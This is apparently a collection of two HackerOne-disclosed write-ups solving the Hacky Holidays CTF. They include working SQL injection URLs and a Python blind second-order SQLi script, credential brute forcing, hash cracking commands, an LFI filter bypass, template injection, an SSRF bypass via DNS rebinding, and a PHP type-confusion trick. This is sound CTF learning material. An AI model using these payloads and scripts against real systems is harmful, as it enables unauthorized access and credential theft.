+ As api/user was valid, that means we've to find username and password out of this. In SQL database, when we try to find any character we use the % symbol in the back-end query.

`Select * from users
where username like 'a%' 
`

+ At this concept, I tried to find the username char by char on the above api/user . thus, our final exploit will be

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=a%\%22--%20-%22,NULL,%22aaa%27%22--%20-

+ If the char will be valid for api/user?username=a%, it'll return with "invalid content type" otherwise "Expected HTTP status 200, Received: 204".

+ So, after bruteforcing for about 20 mins char by char, got the first char as "g " on username, returned with "invalid content-type". 
For the second char, it'll be api/user?username=gr%. After final exploitation for char, got the username as grinchadmin.

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=grinchadmin%\%22--%20-%22,NULL,%22aaa%27%22--%20-

{F1139917}

`Invalid-content type`

+ Similarly, for the password, we can use /api/user?password=a%, after another 20 mins, got the password as "s4nt4sucks".

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?password=s4nt4sucks%\%22--%20-%22,NULL,%22aaa%27%22--%20-


**Response**

{F1139921}

+ Here are the credentials fetched using double SQL injection- username: grinchadmin, password: s4nt4sucks 

+ After using the above credentials inside https://hackyholidays.h1ctf.com/attack-box/login, it was successfully returned with the flag area.

{F1139925}

```
Grinch Network Attack Server
flag{07a03135-9778-4dee-a83c-7ec330728e72}
```

+ Finally, got the flag 11.

+ Flag 11- `flag{07a03135-9778-4dee-a83c-7ec330728e72}`.



**Day12 - CTF level 12**

+ Since I solved flag 11 on day 12, it was already loaded with the level as we can see in the screenshot.
+ Inside https://hackyholidays.h1ctf.com/attack-box, there were three target ips along with an attack option and once we click on the attack option, it'll trigger the payload.

**Request**

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

Decode the base64 payload

{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}

**Response**

+ Redirect to https://hackyholidays.h1ctf.com/attack-box/launch/7e9a25f63e3d1856373c36c9d3e29f89

{F1139926}

+ As per flag 11, if we add random IP over here, it might say the error and I was right:

```
{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}  ---> encode base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

**Request**

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

**Response**

Invalid Protection Hash

+ So as this was the last flag, I didn't think that there might be another case of SQL injection. So, can we try to break the hash itself?
+ Maybe either it can be md5 encrypted or md5 hash salt encrypted.

+ For cracking the hash, one of the best tool is to use "Hashcat".
+ In order to crack the hash, we need 3 or more hashes inside hash file.

+ So, for target 203.0.113.33, 203.0.113.53 and 203.0.113.213, decoded the attack payload and got the 3 hashes that I've stored inside hashes file as:

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```

+ We also need a wordlist, so I've downloaded the rockyou.txt file for this one.

+ Final command to crack using hashcat

hashcat -m 10 hashes rockyou.txt -O 
hashcat -m 10 hashes rockyou.txt --show

{F1139931}

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```

+ Thus, we got salt as mrgrinch463.

+ As per the level, the grinch is trying to attack Santa's server. Thus, in order to stop the grinch, we need to perform an attack on the localhost or 127.0.0.1, then the grinch can be stopped.

**Generating hash for 127.0.0.1 using salt mrgrinch463 and encrypt base64**

```
mrgrinch463127.0.0.1 -----> md5 salted ---> 3e3f8df1658372edf0214e202acb460b ----> use in the above format as {"target":"","hash":""} ----->

{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} ---> encrypt base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
```

+ Our final payload in the url will be:

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==

**Response**

https://hackyholidays.h1ctf.com/attack-box/launch/1dabfbbbea602fefc21f33e24b399833

{F1139937}

+Connection aborted, looks like localhost can't be attacked directly.

+ In the ssrf bypass for the above case (127.0.0.1), I've tried decimal, octal, and differents encoding, didn't worked, tried location header exploit didn't work. 

+ So, I left my computer for a while and got an idea as this CTF was also organized by nahamsec, there might be a case of DNS rebinding attack. [As per Snapchat ssrf exploit which I've already seen]

+ To perform DNS rebinding attacks, I've gone through https://github.com/taviso/rbndr.

In the https://github.com/taviso/rbndr, there was a site as 7f000001.c0a80001.rbndr.us

+ Which it was configured with 127.0.0.1 and 192.168.0.1



finally encrypted with md5 hash salt

```
mrgrinch463mrgrinch4637f000001.c0a80001.rbndr.us

MD5 encrypted salt - de9d82d4ae9a61660701e7e1844ea643

{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}

base64 encode

eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```

+ So, our final payload will be: 

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9

+ This payload can take 4 or 5 times to retry to get the final result.
**Response**

{F1140059}

+ After taking down the grinch network on localhost, it'll redirect to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709


{F1140065}

```


Well done! You've taken down Grinch Networks and saved the holidays!

flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

Thanks for playing, we'd appreciate it if you could leave us some feedback here

```

+ Flag 12 - `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

+ Finally, it was completed and grinch has been taken down.



**DAY 1 - GRINCH EMOTIONS**

{F1140066}

After solving all the flags and taken down the grinch server.

**DAY 12 - UPDATED GRINCH EMOTIONS**

{F1140068}

#Credits

+ Yash sodha (https://mobile.twitter.com/y_sodha)  - A great friend who gave me some hints while I got stuck into the rabbit holes.

+ Discord Channel of Hacker101 - channel #hacky-holidays - A great conversation between ctf master, mods, and members where they gave hints and discussed various topics related to hacky-holidays CTF. 

+ Adam Langley (https://mobile.twitter.com/adamtlangley) - A great CTF creator who created the CTF levels with rising difficulties. Thanks, Adam for providing such CTF. 

+ Nahamsec (https://mobile.twitter.com/NahamSec) - A great organizer for this CTF, provided this CTF to connect with hackerone and gave everyone an opportunity to find flags and get private invites on Hackerone Platform.



Thanks
Kunal

## Impact

+ Completed all the challenges and stopped the grinch.

---

### [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912)

- **Report ID:** `1067912`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @bendtheory
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:09:30.705Z
- **CVE(s):** -

**Vulnerability Information:**

##Foreword
This was an amazing CTF! The first from Hackerone that I've finished and one that I have enjoyed the most. Huge shout out to @adamtlangley for creating this downright poetic challenge. My whopping 20+ invitations are already being put to good use. Hacky Holidays and Merry Hackmas!

##Flag #1 - robots.txt

>'Twas the night before Hackmas, when all through the net
>Not a feature was deployed, not even password reset
>The flag was placed in robots.txt with care
>In hopes that hackers might first look there

A classic! The first flag was nestled in robots.txt, the first place any good hacker or CTFer might look for clues. 

{F1132033}

##Flag #2 - s3cr3t-ar3a
>The flag was nestled all snug in jQuery
>While hackers attempted all of their theories
>I put on my hoodie, my knuckles I cracked
>"I bet I could just right click inspect that"

Going off of Flag 1, the second flag had to be hidden in `/s3cr3t-ar3a`. The source of the page didn't reveal anything interesting. The only thing on the page that looked remotely interesting was the jQuery file hosted locally. 

`<script src="/assets/js/jquery.min.js"></script>`

The version of jQuery used was `jQuery v3.5.1` so I decided to run it through a diff checker online to see if any custom code had been added. 

{F1132043}

Aha! There's a difference! the code clearly looks like it's being used to add a flag to an attribute of an element called `alertbox` which is likely on the `/s3cr3t-ar3a` page. 

```javascript
h1_0 = 'la', h1_1 = '}', h1_2 = '', h1_3 = 'f', h1_4 = 'g', h1_5 = '{b7ebcb75', h1_6 = '8454-', h1_7 = 'cfb9574459f7', h1_8 = '-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```
Rather than reverse engineer this obfuscated code, we can just inspect the `alertbox` element! Gotta love a flag hidden in plain sight. 

{F1132048}

##Flag #3 - People Rater

>Then out in the /apps, there arose a new feature
>a people rater? Man, what could be neater?
>Away to Burp Suite, I flew like a flash
>Tore open the base64, and found Grinch's stash

The Grinch rears his ugly head and tells us how he really feels about the Whos down in Whoville! (spoiler: *not great*)

When a name is clicked, the site retrieves the associated rating with a base64 string:

https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6M30=

That `id` decoded is: `{"id":3}`

Looking for something interesting, I decided to try changing the `id` value to 1, re-encoding, and sending it back to the server - revealing the flag!

The Grinch's heart may be capable of growth but his ego will never shrink. 

{F1132060}

##Flag #4 - Swag Shop

>The endpoints on the API of the shop full of swag
>Gave an idea I might not have otherwise had,
>When what to my wondering eyes did appear,
>But the Grinch's PII and address right here!

Clicking around the swag shop didn't bring up any obvious leads. However, there was an API directory with a few endpoints (`stock` `purchase` and `login`) which made me think there may be a few more. 

I fired up a directory brute  force using dirsearch.py and quickly identified two interesting API endpoints `sessions` and `user`

{F1132081}

The `sessions` endpoint was leaking some juicy data:

```json
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

Session #2 appeared different and piqued my interested. Here it is base64 decoded:

```json
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```
We now have a user ID of sorts (is this Adam's old Windows XP key?) and a cookie. I attempted a few session hijacking attacks using the user and cookie values to no avail. I then took another look at the `user` endpoint. 

```json
{"error":"Missing required fields"}
```

I wasn't sure what those required fields would be, so I started a Param Miner attack in burp to guess query parameters that might be used. The parameter `uuid` popped up and returned a slightly different error message:

```json
{"error":"Could not find matching uuid"}
```

The value of "user" we found on the `sessions` endpoint looked a lot like a UUID... let's try passing it in here!

https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

```json
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```
Looks like we doxxed the Grinch 😎

##Flag #5 - Secure Login

>With a little old login and nothing to click,
>I knew in a moment we must brute force it.
>More rapid than eagles my Intruder's words came
>As I analyzed responses to deduce the username

This challenge looked pretty bare bones. Nothing interesting on the page, nothing found in a directory brute force. However, the error message received after a failed login suggested we could enumerate usernames! Instead of a generic error, the page tells us that our specific username is invalid. 'grinch' and 'admin' didn't work so it looked like brute forcing was the only option. 

I started an intruder attack with a list of common names as payloads and extracted the error messages to see which user had a valid login. The username `access` popped up quickly - which avoided the need to continue sending off an additional 10k requests!

{F1132083}
{F1132084}

Using a "top 100" password list, I set up the same attack to brute force the password and log in:

{F1132087}

So now I could log in with the credentials `access`/`computer` ... but there were no files to download :( However! The base64 session token after logging in appeared to contain a JSON object:

```json
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

Life's better as an admin, so I flipped `false` to `true`, re-encoded, and changed the value of the `securelogin` cookie. After refreshing the page a zip file containing "secure" files showed up. 

{F1132092}

Given the brute-forcey nature of this challenge so far, it was time to guess the password! Kali Linux is preloaded with John the Ripper, a hash cracking tool. JTR is also bundled with a handy binary called `zip2john` which takes a password protected zip file and extracts the hash in a format usable by John the Ripper. 

All that was left was to crack the hash with `john hash.txt` which revealed the password was  `hahahaha`

Using the password to unzip the file gave the flag and `xxx.png`.... which is  a *lewd nude of a green dude*

{F1132093}

##Flag #6 - My Diary
> No root! No admin! Only ere privileged hackers
> Exploiting code from developer slackers.
> Embed the payload to make off with a haul!
> Now `str_replace`! `str_replace`! `str_replace` all!

Judging by the URL: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

...this immediately looked like an LFI challenge.  I quickly found that `entries.html` existed here: https://hackyholidays.h1ctf.com/my-diary/entries.html

I ran a quick fuzz using dirsearch and found that `index.php` existed in the same directory:

https://hackyholidays.h1ctf.com/my-diary/index.php

I then accessed index.php as a template - https://hackyholidays.h1ctf.com/my-diary/?template=index.php - which revealed the following source code:

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

We can see the fake admin page and the "secretadmin" pages here and the protections in place to avoid access to them. 

Trying to access `admin.php` returns a 404, as expected since the page has moved. 

Trying to access `secretadmin.php` states "You cannot view this page from your IP Address"

Looking deeper into the code, the `str_replace` function reminds me of a few XSS filters I've defeated in the past with the classic `<scr<script>ipt>`

Because the value of template is only looking for the values "admin.php" and "secretadmin.php" anywhere in the string and replacing them with empty text, a payload can be crafted to defeat the protection

`secretadsecretadmiadmin.phpn.phpmin.php`

On pass one, the new value of page is `secretadsecretadmin.phpmin.php` with `admin.php` removed

One pass two, the final value of page is `secretadmin.php` with `secretadmin.php` removed. This allows us to dump the contents of secretadmin.php and retrieve the flag:

{F1132099}

Uh oh... the Grinch is  planning to DDoS Santa's Workshop?? I knew this guy was trouble but THIS??? Thankfully we've intercepted this intel in time to save Christmas!

##Flag #7 - Hate Mail Generator

> Whether Bob or Alice, the Grinch hates them both
> "Stinking, rotten, abominable!" he quoth
> Seething with ire, the Grinch routes his mail
> while hackers inject templates to prevail!

The Grinch loves sending the worst mail huh? (*Jury duty, jury duty, jury duty, blackmail, pink slip, chain letter, eviction notice*). Much like the Grinch loves injecting hate mail into our inboxes, we too must inject templates to... save Christmas!

The one sample piece of hate mail we have to work with shows us the format and the syntax `{{template:file.html}}`:

{F1132768}

It looks like files can be included as templates. In order to find the file location, I ran dirsearch.py to find hidden directories. This revealed the `templates` folder and an admin template file! Let's come back to that later, since direct navigation returns a 403 Forbidden error. 

{F1132758}

When writing a new campaign you can either "Create" or "Preview" it. 

{F1132769}

We can't create a campaign because we're "out of credits" but we *can* submit a preview. Here's what that request looks like:

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

The preview syntax appears to be slightly different from the sample campaign. Let's try a few things and see if we can access `38dhs_admins_only_header.html`

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

Response: `You do not have access to the file 38dhs_admins_only_header.html` dangit!

Taking another look at the `preview_data` parameter tells us that `Alice` replaces `{{name}}`. Let's try the same injection but abstracted by a step:

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
...

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

Response: 
{F1132770}

Looks like there's a new ~~sheriff~~ *Grinch Network Admin* in town. 

##Flag #8 - Forum

> He was covered in green fur, from his head to his foot
> Hood up and hacking, Santa's DDoS was afoot!
> The Grinch's secret post laid bare the attack
> We've got to keep cracking and get him right back!

This flag was tricky! An inital brute force of the forum app revealed the phpmyadmin login endpoint

{F1132840}

No amount of fuzzing, bruteforcing, or otherwise hammering the app seemed to yield any results. That's when I decided to check twitter to see if I could get some direction. 

https://twitter.com/JoeMilian1/status/1340297608699457536

Looks like the creator of this devious challenge was Adam! I quickly found a personal site, and a github account. I checked his latest commit which was on the following repo:

https://github.com/Grinch-Networks/forum

{F1132858}

Now we're getting somewhere! All the code related to this forum appeared fairly locked down. I didn't find anything that jumped out at as usable on my first pass. I later noticed that 4 commits had been made to this repo and decided to dig deeper into those to look for secrets. 

https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

{F1132859}

In a commit called "Small fix" we can see that Adam removed a database connection credential which we can view in plain text! Trying this cred on the `phpmyadmin` endpoint gets us to the next step.

{F1132861}

`grinch` appears to be the admin user, so lets try cracking his password! A quick check on crackstation.net reveals that the password is `BahHumbug`. Now we can login to the form as grinch and read his secret plans!

{F1132870}
{F1132871}

Uh oh, the Grinch is getting closer to launch his attack! We can't stop now! and I'm starting to think this "Adam" guy might be working with him...

##Flag #9 - Evil Quiz

> His eyes lurid yellow, like a black cat at night
> His smile a gnarled root, a downright good fright!
> His mind filled with evil, tricks, and malaise
> Made this SQLi challenge go on for days

The difficulty really began to ramp up with this challenge. I first thought there was going to be a blind XSS element with the name being reflected after the quiz. But I started to notice that different names had different number of players who also used the same name. Using "grinch" as a name told me 

`There is 14 other player(s) with the same name as you!`

I started to imagine what SQL query might retrieve that information:

```sql
SELECT count(*) FROM sessions WHERE name = 'grinch';
```

I changed my name to `grinch' AND 1=1;--`, completed the quiz... and got the same response!

{F1133306}

I then changed my name to `grinch' AND 1=2;--`, completed the quiz, and was told that there were 0 other players with my name. Se we now had a blind SQLi attack and a 1 byte difference -- 14 vs 0 -- that we could use for our boolean checks. 

Writing a script for this would be tricky because this is a second order SQL injection: we first have to set the payload, then trigger the payload with a second request. To add insult to injury, the response time on this challenge is *abyssmal*. Nevertheless, I developed a script to perform substring character brute forcing to ascetain the table, columns, and data needed to access the admin section. 

```python
import requests

url1 = 'https://hackyholidays.h1ctf.com/evil-quiz' #POST
url2 = 'https://hackyholidays.h1ctf.com/evil-quiz/score' #GET

#threshold = 1953 # create an dict with thresold values, if we have two values

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^*()-_=+[{]}\|;:,/?"

s = requests.Session()
cookie_obj = requests.cookies.create_cookie(domain='hackyholidays.h1ctf.com',name='session',value='f0dd61e4a671f34f123e36e0b8f2727c')
s.cookies.set_cookie(cookie_obj)
pos = 1
threshold = 0
out = ''
while True:
	found = 0
	for c in alphabet:
		
		# blind sqli brute force 1: find a table
		# select table_name from information_schema.tables where table_schema=database() limit 1
		# discovered table named 'admin'
		
		# blind sqli brute force 2: find columns in admin table 
		# select column_name from information_schema.columns where table_name='admin'
		# discovered columns id, password, username in table 'admin'
		
		# blind sqli brute force 3: find username in admin table
		# select username from admin where id='1'
		# discovered username 'admin'
		
		# blind sqli brute force 4: find password in admin table
		# select password from admin where username='admin'
		# discovered password 'S3creT_p4ssw0rd-$'
		
		payload = "grinch' AND hex(substring((select password from admin where username='admin'),%s,1))=hex('%s');--" % (str(pos), c)
		
		params = {"name":payload}

		s.post(url1, data=params)
		r2 = s.get(url2) 
		if (threshold == 0):
			# response length will increase with payload length. remove the payload length from the response length to negate this
			#100 + 50
			#100 - 50 = 50
			#101 + 51
			#101 - 51 = 50
			threshold = len(r2.text) - len(payload)
		
		# a true response will return at least one more byte than a false response. break and continue to the next character if we get a hit. 
		if ((len(r2.text) - len(payload)) > threshold):
			out += c
			print out
			found = 1
			break
			
		# TODO: edge case where first letter in alphabet returns true response. This was done manually for finding 'admin' table

	if (found):
		pos += 1
		continue
	else:
		print out
		break
```

This script will select one letter at a time from the password for the username `admin` and perform a a boolean brute force check on each letter. The first character of the password isn't 'a' so the script continues until it gets to 'S'. The response is 1 byte larger meaning our SQL statement was true and the first character of the password is 'S'. That process is repeated until all characters are identified.  

{F1133308}

The final username / password combo was `admin` / `S3creT_p4ssw0rd-$` which gave access to the flag:

{F1133082}

I reran this script and it took almost an hour to complete! It took the better half of a day to finally bruteforce the password the first time around. 

##Flag #10 - Signup Manager
> The zip of source code was easy to see
> but not the PHP trick that lie underneath.
> Surely there has to be some kind of quirk.
> Numeric type confusion just might work!

The flag was a cut and dry case of RTFM. By carefully reading the provided code and the PHP docs, the flag is easy to spot. Regardless, this was one of my favorite challenges because I learned soemthing new about PHP! Thanks..... *grinch*. hmph. 

Before even attempting to sign up, I found an HTML comment in the source directing me to `README.md` which contained the following:

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

I was able to download `signupmanager.zip` at the following URL: https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

Unzipping the file reveals the source code for the site. The file `index.php` appears to have the code that creates an entry in `users.txt` which is referenced when logging in. Based on step 6 in the README, it looks like our objective is to create an entry in user.txt that ends in `Y` which will make the user an admin. 

I had a difficult time imagining what the entries in user.txt would look like so I spun up the php code in a digital ocean droplet to see for myself!

http://159.65.226.16/hacky/

I made users.txt accessible for ease of testing: http://159.65.226.16/hacky/users.txt

{F1133117}

I tried spamming `Y` in the last name and maxing out the values for each aspect of the entry but was unable to extend the length beyond what was intended. Looking at the code again, I went through each validation function to see if any of them could be bypassed in some way. 

```php
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
```
username, firstname, and lastname are capped at 15 chars with the `substr` function. the password is md5 hashed which is always 32 chars. That left `age` which is checked to ensure it is numeric with `is_numeric` and then `intval` is used  to get the final value. 

`is_numeric` seemed ... *flexible* so I looked it up in the PHP docs. 

{F1133118}

The entry `1337e0` stood out because it looked like a scientific notation and is considered numeric by PHP. Our PHP code specifically checks the length to ensure the number is less than 3 characters, but it could be replaced with something like `9e9` which is interprested by PHP as `9 * 10 ^ 9`. This has an integer value of  `9000000000` - waaay longer than 3 characters!

By capturing a signup request and modifying the age value to `9e9` and making the last name `YYYYYYYYYYYYYYY` the length of our age will push a `Y` into the last position of our entry in users.txt, making our new user an admin!

{F1133127}
{F1133128}

